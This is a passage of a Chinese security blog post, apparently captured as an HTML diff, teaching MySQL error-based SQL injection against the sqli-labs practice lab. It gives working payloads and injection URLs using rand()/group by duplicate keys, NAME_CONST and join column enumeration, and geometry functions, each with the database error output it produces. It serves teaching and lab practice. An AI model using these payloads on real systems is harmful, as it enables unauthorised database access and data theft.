class="built_in">count</span>(*) <span class="keyword">from</span> information_schema.<span class="built_in">tables</span> <span class="built_in">group</span> <span class="keyword">by</span> concat((<span class="keyword">select</span> concat(table_schema,':',table_name) <span class="keyword">from</span> information_schema.<span class="built_in">tables</span> limit <span class="number">0</span>,<span class="number">1</span>),<span class="built_in">floor</span>(<span class="built_in">rand</span>(<span class="number">0</span>)*<span class="number">2</span>));</div><div class="line">ERROR <span class="number">1062</span> (<span class="number">23000</span>): Duplicate entry 'information_schema:CHARACTER_SETS1' for <span class="built_in">key</span> 'group_key'</div></pre></td></tr></table></figure>
+</li>
+<li><p>注入实例：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">http://192.168.100.8/sqli-labs/Less-5/?id=1' union <span class="keyword">select</span> <span class="keyword">count</span>(*),<span class="number">2</span>,<span class="number">3</span> <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">group</span> <span class="keyword">by</span> <span class="keyword">concat</span>(<span class="keyword">database</span>(),<span class="keyword">floor</span>(<span class="keyword">rand</span>(<span class="number">0</span>)*<span class="number">2</span>))<span class="comment">-- </span></div><div class="line"><span class="keyword">http</span>://<span class="number">192.168</span><span class="number">.100</span><span class="number">.8</span>/sqli-labs/<span class="keyword">Less</span><span class="number">-5</span>/?<span class="keyword">id</span>=<span class="number">1</span><span class="string">' union select count(*),2,3 from information_schema.tables group by concat((select concat(table_schema,'</span>:<span class="string">',table_name) from information_schema.tables limit 0,1),floor(rand(0)*2))--</span></div></pre></td></tr></table></figure>
+</li>
+</ul>
+<h2 id="数据库的一些特性"><a href="#数据库的一些特性" class="headerlink" title="数据库的一些特性"></a>数据库的一些特性</h2><ul>
+<li>利用数据库的一些特性产生报错信息。</li>
+</ul>
+<h3 id="列名重复"><a href="#列名重复" class="headerlink" title="列名重复"></a>列名重复</h3><ul>
+<li><p>mysql列名重复会报错，我们利用name_const来制造一个列，根据官方文档，name_const函数要求参数必须是常量，所以实际使用上还没找到什么比较好的利用方式。</p>
+<figure class="highlight subunit"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">mysql&gt; select * from (select NAME_CONST(version(),1),NAME_CONST(version(),1))x;</div><div class="line"><span class="keyword">ERROR </span>1060 (42S21): Duplicate column name '5.5.36-log'</div></pre></td></tr></table></figure>
+</li>
+<li><p>利用这个特性加上join函数可以爆列名：</p>
+<figure class="highlight subunit"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">mysql&gt; select * from(select * from users a join users b)c;</div><div class="line"><span class="keyword">ERROR </span>1060 (42S21): Duplicate column name 'id'</div><div class="line">mysql&gt; select * from(select * from users a join users b using(id))c;</div><div class="line"><span class="keyword">ERROR </span>1060 (42S21): Duplicate column name 'username'</div><div class="line">mysql&gt; select * from(select * from users a join users b using(id,username))c;</div><div class="line"><span class="keyword">ERROR </span>1060 (42S21): Duplicate column name 'password'</div></pre></td></tr></table></figure>
+</li>
+<li><p>注入实例：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://192.168.100.8/sqli-labs/Less-5/?id=1'union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="keyword">NAME_CONST</span>(<span class="keyword">version</span>(),<span class="number">1</span>),<span class="keyword">NAME_CONST</span>(<span class="keyword">version</span>(),<span class="number">1</span>))x <span class="comment">--</span></div></pre></td></tr></table></figure>
+</li>
+</ul>
+<h3 id="几何函数"><a href="#几何函数" class="headerlink" title="几何函数"></a>几何函数</h3><ul>
+<li>mysql有些几何函数，例如geometrycollection()，multipoint()，polygon()，multipolygon()，linestring()，multilinestring()，这些函数对参数要求是形如(1 2,3 3,2 2 1)这样几何数据，如果不满足要求，则会报错。经测试，在版本号为5.5.47上可以用来注入，而在5.7.17上则不行，不同的函数情况版本情况可能不一样。</li>
+</ul>
+<h4 id="geometrycollection"><a href="#geometrycollection" class="headerlink" title="geometrycollection()"></a>geometrycollection()</h4><ul>
+<li><p>GeometryCollection是由1个或多个任意类几何对象构成的几何对象。GeometryCollection中的所有元素必须具有相同的空间参考系（即相同的坐标系）。对GeometryCollection的元素无任何限制。攻击载荷查询的为一串字符,然后用处理geometrycollection(),由于MYSQL无法用这样字符串画出图形,所以报错了。</p>
+<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">mysql&gt; <span class="keyword">select</span> geometrycollection((<span class="keyword">select</span> * <span class="keyword">from</span>(<span class="keyword">select</span> * <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a)b));</div><div class="line">ERROR 1367 (22007): Illegal non geometric '(<span class="keyword">select</span> <span class="symbol">`b`</span>.<span class="symbol">`user()`</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="string">'root@localhost'</span> <span class="keyword">AS</span> <span class="symbol">`user()`</span> <span class="keyword">from</span> dual) <span class="symbol">`b`</span>)<span class="string">' value found during parsing</span></div><div class="line"><span class="string">mysql&gt; select geometrycollection((select * from(select * from(select database())a)b));</span></div><div class="line"><span class="string">ERROR 1367 (22007): Illegal non geometric '</span>(<span class="keyword">select</span> <span class="symbol">`b`</span>.<span class="symbol">`database()`</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="string">'security'</span> <span class="keyword">AS</span> <span class="symbol">`database()`</span> <span class="keyword">from</span> dual) <span class="symbol">`b`</span>)<span class="string">' value found during parsing</span></div><div class="line"><span class="string">mysql&gt; select geometrycollection((select * from(select * from(select concat(table_schema, '</span>:<span class="string">',table_name) from information_schema.tables limit 0,1)a)b));</span></div><div class="line"><span class="string">ERROR 1367 (22007): Illegal non geometric '</span>(<span class="keyword">select</span> <span class="symbol">`b`</span>.<span class="symbol">`concat(table_schema, ':',table_name)`</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="string">'information_schema:CHARACTER_SETS'</span> <span class="keyword">AS</span> <span class="symbol">`concat(table_schema, ':',table_name)`</span> <span class="keyword">from</span> dual) <span class="symbol">`b`</span>)<span class="string">' value found during parsing</span></div><div class="line"><span class="string">mysql&gt; select geometrycollection((select * from(select * from(select group_concat(table_name) from information_schema.tables where table_schema='</span>security<span class="string">')a)b));</span></div><div class="line"><span class="string">ERROR 1367 (22007): Illegal non geometric '</span>(<span class="keyword">select</span> <span class="symbol">`b`</span>.<span class="symbol">`group_concat(table_name)`</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="string">'emails,referers,uagents,users'</span> <span class="keyword">AS</span> <span class="symbol">`group_concat(table_name)`</span> <span class="keyword">from</span> dual) <span class="symbol">`b`</span>)<span class="string">' value found during parsing</span></div></pre></td></tr></table></figure>
+</li>
+<li><p>注入实例：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">http://192.168.100.8/sqli-labs/Less-5/?id=1' and geometrycollection((<span class="keyword">select</span> * <span class="keyword">from</span>(<span class="keyword">select</span> * <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">database</span>())a)b)) <span class="comment">-- </span></div><div class="line"><span class="keyword">http</span>://<span class="number">192.168</span><span class="number">.100</span><span class="number">.8</span>/sqli-labs/<span class="keyword">Less</span><span class="number">-5</span>/?<span class="keyword">id</span>=<span class="number">1</span><span class="string">' union select geometrycollection((select * from(select * from(select database())a)b)),2,3 -- </span></div><div class="line"><span class="string">http://192.168.100.8/sqli-labs/Less-5/?id=1'</span> <span class="keyword">and</span> geometrycollection((<span class="keyword">select</span> * <span class="keyword">from</span>(<span class="keyword">select</span> * <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="string">'security'</span>)a)b))<span class="comment">-- </span></div><div class="line"><span class="keyword">http</span>://<span class="number">192.168</span><span class="number">.100</span><span class="number">.8</span>/sqli-labs/<span class="keyword">Less</span><span class="number">-5</span>/?<span class="keyword">id</span>=<span class="number">1</span><span class="string">' union geometrycollection((select * from(select * from(select group_concat(table_name) from information_schema.tables where table_schema='</span><span class="keyword">security</span><span class="string">')a)b)),2,3--</span></div></pre></td></tr></table></figure>
+</li>
+</ul>
+<h4 id="multipoint"><a href="#multipoint" class="headerlink" title="multipoint()"></a>multipoint()</h4><ul>
+<li><p>MultiPoint是一种由Point元素构成的几何对象集合。这些点未以任何方式连接或排序。</p>
+<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">mysql&gt; <span class="keyword">select</span> multipoint((<span class="keyword">select</span> * <span class="keyword">from</span>(<span class="keyword">select</span> * <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">database</span>())a)b));</div><div class="line">ERROR 1367 (22007): Illegal non geometric '(<span class="keyword">select</span> <span class="symbol">`b`</span>.<span class="symbol">`database()`</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="string">'security'</span> <span class="keyword">AS</span> <span class="symbol">`database()`</span> <span class="keyword">from</span> dual) <span class="symbol">`b`</span>)<span class="string">' value found during parsing</span></div></pre></td></tr></table></figure>
+</li>
+<li><p>其余用法同geometrycollection()。</p>
+</li>
+</ul>
+<h4 id="polygon"><a href="#polygon" class="headerlink" title="polygon()"></a>polygon()</h4><ul>
+<li><p>Polygon是代表多边几何对象的平面Surface。它由单个外部边界以及0或多个内部边界定义，其中，每个内部边界定义为Polygon中的1个孔。</p>
+<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">mysql&gt; <span class="keyword">select</span> polygon((<span class="keyword">select</span> * <span class="keyword">from</span>(<span class="keyword">select</span> * <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a)b));</div><div class="line">ERROR 1367 (22007): Illegal non geometric '(<span class="keyword">select</span> <span class="symbol">`b`</span>.<span class="symbol">`user()`</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="string">'root@localhost'</span> <span class="keyword">AS</span> <span class="symbol">`user()`</span> <span class="keyword">from</span> dual) <span class="symbol">`b`</span>)<span class="string">' value found during parsing</span></div></pre></td></tr></table></figure>
+</li>
+<li><p>其余用法同geometrycollection()。</p>
+</li>
+</ul>
+<h4 id="multipolygon"><a href="#multipolygon" class="headerlink" title="multipolygon()"></a>multipolygon()</h4><ul>
+<li><p>multipolygon()是一种由Polygon元素构成的几何对象集合。</p>
+<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">mysql&gt; <span class="keyword">select</span> multipolygon((<span class="keyword">select</span> * <span class="keyword">from</span>(<span class="keyword">select</span> * <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a)b));</div><div class="line">ERROR 1367 (22007): Illegal non geometric '(<span class="keyword">select</span> <span class="symbol">`b`</span>.<span class="symbol">`user()`</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="string">'root@localhost'</span> <span class="keyword">AS</span> <span class="symbol">`user()`</span> <span class="keyword">from</span> dual) <span class="symbol">`b`</span>)<span class="string">' value found during parsing</span></div></pre></td></tr></table></figure>
+</li>
+<li><p>其余用法同geometrycollection()。</p>
+</li>
+</ul>
+<h4 id="linestring"><a href="#linestring" class="headerlink" title="linestring()"></a>linestring()</h4><ul>
+<li><p>　LineString()是具有点之间线性内插特性的Curve。</p>
+<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">mysql&gt; <span class="keyword">select</span> linestring((<span class="keyword">select</span> * <span class="keyword">from</span>(<span class="keyword">select</span> * <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a)b));</div><div class="line">ERROR 1367 (22007): Illegal non geometric '(<span class="keyword">select</span> <span class="symbol">`b`</span>.<span class="symbol">`user()`</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="string">'root@localhost'</span> <span class="keyword">AS</span> <span class="symbol">`user()`</span> <span class="keyword">from</span> dual) <span class="symbol">`b`</span>)<span class="string">' value found during parsing</span></div></pre></td></tr></table></figure>
+</li>
+<li><p>其余用法同geometrycollection()。</p>
+</li>
+</ul>
+<h4 id="multilinestring"><a href="#multilinestring" class="headerlink" title="multilinestring()"></a>multilinestring()</h4><ul>
+<li><p>multilinestring()是一种由LineStirng元素构成的MultiCurve几何对象集合。</p>
+<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">mysql&gt; <span class="keyword">select</span> multilinestring((<span class="keyword">select</span> * <span class="keyword">from</span>(<span class="keyword">select</span> * <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a)b));</div><div class="line">ERROR 1367 (22007): Illegal non geometric '(<span class="keyword">select</span> <span class="symbol">`b`</span>.<span class="symbol">`user()`</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="string">'root@localhost'</span> <span class="keyword">AS</span> <span class="symbol">`user()`</span> <span class="keyword">from</span> dual) <span class="symbol">`b`</span>)<span class="string">' value found during parsing</span></div></pre></td></tr></table></figure>
+</li>
+<li><p>其余用法同geometrycollection()。</p>
+</li>
+</ul>
+<h3 id="参考文档"><a href="#参考文档" class="headerlink" title="参考文档"></a>参考文档</h3><ul>
+<li><a href="https://xz.aliyun.com/t/253" target="_blank" rel="external">MYSQL报错注入的一点总结</a></li>
+<li><a href="http://www.cnblogs.com/lcamry/articles/5509124.html" target="_blank" rel="external">（转载）使用exp进行SQL报错注入</a></li>
+<li><a href="http://www.cnblogs.com/lcamry/articles/5509112.html" target="_blank" rel="external">(转载)基于BIGINT溢出错误的SQL注入</a></li>
+<li><a href="https://www.cnblogs.com/MiWhite/p/6241265.html" target="_blank" rel="external">十种MYSQL显错注入原理讲解（一）</a></li>
+<li><a href="https://www.cnblogs.com/MiWhite/p/6254336.html" target="_blank" rel="external">十种MYSQL显错注入原理讲解（二）</a></li>
+<li><a href="https://www.cnblogs.com/MiWhite/p/6384711.html" target="_blank" rel="external">十种MYSQL显错注入原理讲解（三）</a></li>
+<li><a href="http://vinc.top/2017/03/23/%E3%80%90sql%E6%B3%A8%E5%85%A5%E3%80%91%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93/" target="_blank" rel="external">【SQL注入】报错注入姿势总结</a></li>
+</ul>
+</the></excerpt>
+      
+    </div>
+    
+  </div>
+  
+    
+    <div class="copyright">
+        <p><span>本文标题:</span><a href="/2018/08/28/MySQL报错注入/">MySQL报错注入</a></p>
+        <p><span>文章作者:</span><a href="/" title="回到主页">HatBoy</a></p>
+        <p><span>发布时间:</span>2018-08-28, 09:53:15</p>
+        <p><span>最后更新:</span>2018-08-28, 09:54:45</p>
+        <p>
+            <span>原始链接:</span><a class="post-url" href="/2018/08/28/MySQL报错注入/" title="MySQL报错注入">https://hatboy.github.io/2018/08/28/MySQL报错注入/</a>
+            <span class="copy-path" data-clipboard-text="原文: https://hatboy.github.io/2018/08/28/MySQL报错注入/　　作者: HatBoy" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <script> var clipboard = new Clipboard('.copy-path'); </script>
+        </p>
+        <p>
+            <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
+        </p>
+    </div>
+
+
+
+    <nav id="article-nav">
+        
+        
+            <div id="article-nav-older" class="article-nav-title">
+                <a href="/2018/08/28/内网端口转发及穿透/">
+                    内网端口转发及穿透
+                </a>
+            </div>
+        
+    </nav>
+
+  
+</article>
+
+    <div id="toc" class="toc-article">
+        <strong class="toc-title">文章目录</strong>
+        
+            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#BIGINT等数据类型溢出"><span class="toc-number">1.</span> <span class="toc-text">BIGINT等数据类型溢出</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Xpath语法错误"><span class="toc-number">2.</span> <span class="toc-text">Xpath语法错误</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#concat-rand-group-by-导致主键重复"><span class="toc-number">3.</span> <span class="toc-text">concat+rand()+group_by()导致主键重复</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#数据库的一些特性"><span class="toc-number">4.</span> <span class="toc-text">数据库的一些特性</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#列名重复"><span class="toc-number">4.1.</span> <span class="toc-text">列名重复</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#几何函数"><span class="toc-number">4.2.</span> <span class="toc-text">几何函数</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#geometrycollection"><span class="toc-number">4.2.1.</span> <span class="toc-text">geometrycollection()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#multipoint"><span class="toc-number">4.2.2.</span> <span class="toc-text">multipoint()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#polygon"><span class="toc-number">4.2.3.</span> <span class="toc-text">polygon()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#multipolygon"><span class="toc-number">4.2.4.</span> <span class="toc-text">multipolygon()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#linestring"><span class="toc-number">4.2.5.</span> <span class="toc-text">linestring()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#multilinestring"><span class="toc-number">4.2.6.</span> <span class="toc-text">multilinestring()</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#参考文档"><span class="toc-number">4.3.</span> <span class="toc-text">参考文档</span></a></li></ol></li></ol>
+        
+    </div>
+    <style>
+        .left-col .switch-btn,
+        .left-col .switch-area {
+            display: none;
+        }
+        .toc-level-3 i,
+        .toc-level-3 ol {
+            display: none !important;
+        }
+    </style>
+
+    <input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">
+
+    <script>
+        yiliaConfig.toc = ["隐藏目录", "显示目录", !!"false"];
+    </script>
+
+
+
+    
+<div class="share">
+    
+        <div class="bdsharebuttonbox">
+            <a href="#" class="fa fa-twitter bds_twi" data-cmd="twi" title="分享到推特"></a>
+            <a href="#" class="fa fa-weibo bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
+            <a href="#" class="fa fa-qq bds_sqq" data-cmd="sqq" title="分享给 QQ 好友"></a>
+            <a href="#" class="fa fa-files-o bds_copy" data-cmd="copy" title="复制网址"></a>
+            <a href="#" class="fa fa fa-envelope-o bds_mail" data-cmd="mail" title="通过邮件分享"></a>
+            <a href="#" class="fa fa-weixin bds_weixin" data-cmd="weixin" title="生成文章二维码"></a>
+            <a href="#" class="fa fa-share-alt bds_more" data-cmd="more"></i></a>
+        </div>
+        <script>
+            window._bd_share_config={
+                "common":{"bdSnsKey":{},"bdText":"MySQL报错注入　| HatBoy的个人主页　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+        </script>
+    
+
+    
+</div>
+
+
+
+
+
+
+
+    
+        <section id="comments">
+    <style> aside.comment-bar { margin: auto 30px; }</style>
+    <div id="disqus_thread"></div>
+    <script>
+        var disqus_config = function(){
+            this.page.url = 'https://hatboy.github.io/2018/08/28/MySQL报错注入/';
+            this.page.identifier = '2018/08/28/MySQL报错注入/';
+        };
+        var loadComment = function(){
+            var d = document, s = d.createElement('script');
+            s.src = '//hatboy007.disqus.com/embed.js';
+            s.setAttribute('data-timestamp', +new Date());
+            (d.head || d.body).appendChild(s);
+        }
+    </script>
+    
+    <script> loadComment(); </script>
+
+</section>
+
+
+    
+
+
+
+
+    <div class="scroll" id="post-nav-button">
+        
+            <a href="/" title="回到主页"><i class="fa fa-home"></i></a>
+        
+
+        <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
+
+        
+            <a href="/2018/08/28/内网端口转发及穿透/" title="下一篇: 内网端口转发及穿透">
+                <i class="fa fa-angle-right"></i>
+            </a>
+        
+    </div>
+
+    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2018/08/28/MySQL报错注入/">MySQL报错注入</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/08/28/内网端口转发及穿透/">内网端口转发及穿透</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/04/28/Python编写socks5服务器/">Python编写socks5服务器</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/04/19/Python沙箱逃逸总结/">Python沙箱逃逸总结</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/02/27/如何恢复丢失的Python源代码如果它还在内存中运行/">如何恢复丢失的Python源代码如果它还在内存中运行</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/02/08/pathlib：文件系统路径作为对象/">pathlib：文件系统路径作为对象</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/12/21/asyncio：异步IO、事件循环和并发/">asyncio：异步IO、事件循环和并发</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/12/21/asyncio之调试asyncio/">asyncio之调试asyncio</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/12/21/asyncio之协程结合线程和进程/">asyncio之协程结合线程和进程</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/12/21/asyncio之接收Unix信号/">asyncio之接收Unix信号</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/12/21/asyncio之使用子进程/">asyncio之使用子进程</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/12/21/asyncio之与DNS服务进行交互/">asyncio之与DNS服务进行交互</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/12/21/asyncio之使用SSL/">asyncio之使用SSL</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/12/21/asyncio之使用协程和流的异步I-O/">asyncio之使用协程和流的异步I/O</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/12/21/asyncio之协议抽象类的异步I-O/">asyncio之协议抽象类的异步I/O</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/12/21/asyncio之同步原语/">asyncio之同步原语</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/12/21/asyncio之用控制结构组建协程/">asyncio之用控制结构组建协程</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/12/21/asyncio之并发执行Tasks/">asyncio之并发执行Tasks</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/12/21/asyncio之异步生产结果/">asyncio之异步生产结果</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/12/21/asyncio之定时调度常规函数/">asyncio之定时调度常规函数</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/12/21/asyncio之使用协程处理多任务/">asyncio之使用协程处理多任务</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/12/21/asyncio之异步并发的概念/">asyncio之异步并发的概念</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/12/21/Python上下文管理器/">Python上下文管理器</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/12/21/Python-importlib讲解/">Python importlib讲解</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/12/21/第七章-用Cython包装C库/">第七章 用Cython包装C库</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/08/16/第六章-组织Cython代码/">第六章 组织Cython代码</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/08/10/第五章-Cython和扩展类型/">第五章 Cython和扩展类型</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/07/31/第四章-Cython实践：N-body模拟/">第四章 Cython实践：N-body模拟</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/07/31/Python性能分析与调试/">Python性能分析与调试</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/07/17/第三章-深入Cython/">第三章 深入Cython</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/07/03/第二章-编译和运行Cython代码/">第二章 编译和运行Cython代码</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/07/02/第一章-Cython简介/">第一章 Cython简介</a></li></ul>
+
+
+
+
+    <script>
+        
+    </script>
+</div>
+      <footer id="footer">
+    <div class="outer">
+        <div id="footer-info">
+            <div class="footer-left">
+                <i class="fa fa-copyright"></i> 
+                2017-2018 HatBoy
+            </div>
+            <div class="footer-right">
+                <a href="http://hexo.io/" target="_blank" title="快速、简洁且高效的博客框架">Hexo</a>  Theme <a href="https://github.com/MOxFIVE/hexo-theme-yelee" target="_blank" title="简而不减 Hexo 双栏博客主题  v3.5">Yelee</a> by MOxFIVE <i class="fa fa-heart animated infinite pulse"></i>
+            </div>
+        </div>
+        
+            <div class="visit">
+                
+                    <span id="busuanzi_container_site_pv" style='display:none'>
+                        <span id="site-visit" title="本站到访数"><i class="fa fa-user" aria-hidden="true"></i><span id="busuanzi_value_site_uv"></span>
+                        </span>
+                    </span>
+                
+                
+                    <span>| </span>
+                
+                
+                    <span id="busuanzi_container_page_pv" style='display:none'>
+                        <span id="page-visit"  title="本页阅读量"><i class="fa fa-eye animated infinite pulse" aria-hidden="true"></i><span id="busuanzi_value_page_pv"></span>
+                        </span>
+                    </span>
+                
+            </div>
+        
+    </div>
+</footer>
+    </div>
+    
+<script data-main="/js/main.js" src="//cdn.bootcss.com/require.js/2.2.0/require.min.js"></script>
+
+
+
+
+
+    <script type="text/x-mathjax-config">
+MathJax.Hub.Config({
+    tex2jax: {
+        inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+        processEscapes: true,
+        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+    }
+});
+
+MathJax.Hub.Queue(function() {
+    var all = MathJax.Hub.getAllJax(), i;
+    for(i=0; i < all.length; i += 1) {
+        all[i].SourceElement().parentNode.className += ' has-jax';                 
+    }       
+});
+</script>
+
+<script src="//cdn.bootcss.com/mathjax/2.6.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+</script>
+
+
+<div class="scroll" id="scroll">
+    <a href="#" title="返回顶部"><i class="fa fa-arrow-up"></i></a>
+    <a href="#comments" onclick="load$hide();" title="查看评论"><i class="fa fa-comments-o"></i></a>
+    <a href="#footer" title="转到底部"><i class="fa fa-arrow-down"></i></a>
+</div>
+<script>
+    // Open in New Window
+    
+        $("a").attr("target", "_blank");
+        $("#scroll a, #toc a").removeAttr("target");
+    
+</script>
+
+<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+  </div>
+</body>
+</html>
